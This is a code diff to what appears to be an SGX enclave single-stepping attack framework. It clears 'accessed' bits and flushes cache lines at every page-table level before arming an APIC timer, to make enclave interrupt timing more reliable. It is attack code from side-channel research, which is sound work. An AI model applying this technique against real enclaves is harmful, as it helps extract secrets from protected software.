@@ -50,6 +50,8 @@ int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
 uint64_t *pte_encl = NULL;
 uint64_t *pte_str_encl = NULL;
 uint64_t *pmd_encl = NULL;
+uint64_t *pud_encl = NULL;
+uint64_t *pgd_encl = NULL;
 
 /* ================== ATTACKER IRQ/FAULT HANDLERS ================= */
 
@@ -88,14 +90,20 @@ void aep_cb_func(void) {
     /*
      * Configure APIC timer interval for next interrupt.
      *
-     * NOTE: _Additionally_ clearing the PMD "accessed" bit forces the CPU to take a
-     * ucode-assisted page-table walk for the first instruction following
-     * ERESUME, which causes that instruction to be much longer. We
-     * additionally flush this PMD from the cache to further delay the
-     * page-table walk and increase the landing space for the timer interrupt.
+     * NOTE: _Additionally_ clearing the "accessed" bit at every page-table level
+     * forces the CPU to take a ucode-assisted page-table walk for the first
+     * instruction following ERESUME, which causes that instruction to be much
+     * longer. We additionally flush these entries from the cache to further
+     * delay the page-table walk and increase the landing space for the timer
+     * interrupt. Clearing only the PMD leaves a landing window that is too
+     * narrow on low-frequency CPUs (e.g. Goldmont).
      */
     if (do_irq) {
+        *pgd_encl = MARK_NOT_ACCESSED(*pgd_encl);
+        *pud_encl = MARK_NOT_ACCESSED(*pud_encl);
         *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
+        flush(pgd_encl);
+        flush(pud_encl);
         flush(pmd_encl);
         apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
     }
@@ -163,6 +171,10 @@ void attacker_config_page_table(void) {
     // print_page_table( get_enclave_base() );
     ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
     ASSERT(PRESENT(*pmd_encl));
+    ASSERT(pud_encl = remap_page_table_level(get_enclave_base(), PUD));
+    ASSERT(PRESENT(*pud_encl));
+    ASSERT(pgd_encl = remap_page_table_level(get_enclave_base(), PGD));
+    ASSERT(PRESENT(*pgd_encl));
 }
 
 /* ================== ATTACKER MAIN ================= */
